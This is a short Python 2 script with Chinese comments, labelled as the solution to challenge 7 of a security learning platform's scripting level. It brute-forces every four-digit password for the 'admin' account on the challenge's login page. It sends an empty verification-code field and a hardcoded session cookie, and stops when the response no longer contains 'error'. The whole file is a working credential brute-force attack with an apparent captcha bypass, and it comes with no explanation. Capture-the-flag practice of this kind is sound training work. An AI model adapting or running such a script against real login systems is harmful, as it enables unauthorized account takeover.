#coding:utf-8
try:
  import requests
except ImportError:
  raise SystemExit('\n[!] requests模块导入错误,请执行pip install requests安装!')

try:
  print '\n网络信息安全攻防学习平台脚本关第7题\n'
  s = requests.Session()
  url = 'http://1.hacklist.sinaapp.com/vcode3_9d1ea7ad52ad93c04a837e0808b17097/login.php'
  for pwd in xrange(1000, 10000):
    payload = {'username': 'admin', 'pwd': pwd, 'vcode': ''}
    header = {'Cookie': 'saeut=125.122.24.125.1416063016314663; PHPSESSID=2477842dec43ca1394e3c47867223295'}
    r = s.post(url, data=payload, headers=header)
    if 'error' not in r.content:
      print '\n爷,正确密码为:', pwd
      print '\n' + r.content
      break
    else:
      print '正在尝试密码:', pwd
except KeyboardInterrupt:
  raise SystemExit('大爷,按您的吩咐,已成功退出！')